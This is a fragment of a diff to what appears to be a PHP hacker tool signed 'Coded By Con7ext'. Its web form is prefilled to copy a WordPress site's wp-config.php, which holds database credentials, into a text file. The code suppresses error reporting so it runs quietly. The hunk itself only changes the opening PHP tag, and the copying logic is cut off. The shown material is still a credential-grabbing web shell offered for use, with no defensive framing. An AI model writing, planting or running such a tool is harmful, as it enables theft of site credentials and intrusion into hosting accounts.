@@ -5,7 +5,7 @@
 <b><a href="https://www.facebook.com/rinto2234">Coded By Con7ext</a></b><br>
 <form method="post"><br>File Target : <input name="dir" value="/home/user/public_html/wp-config.php">
 <br>Save As: <input name="jnck" value="ojayakan.txt"><input name="ojaykan" type="submit" value="Eksekusi Gan"></form><br>
-<?
+<?php
 @error_reporting(0);
 @ini_set('display_errors', 0); 
 if($_POST['ojaykan']){
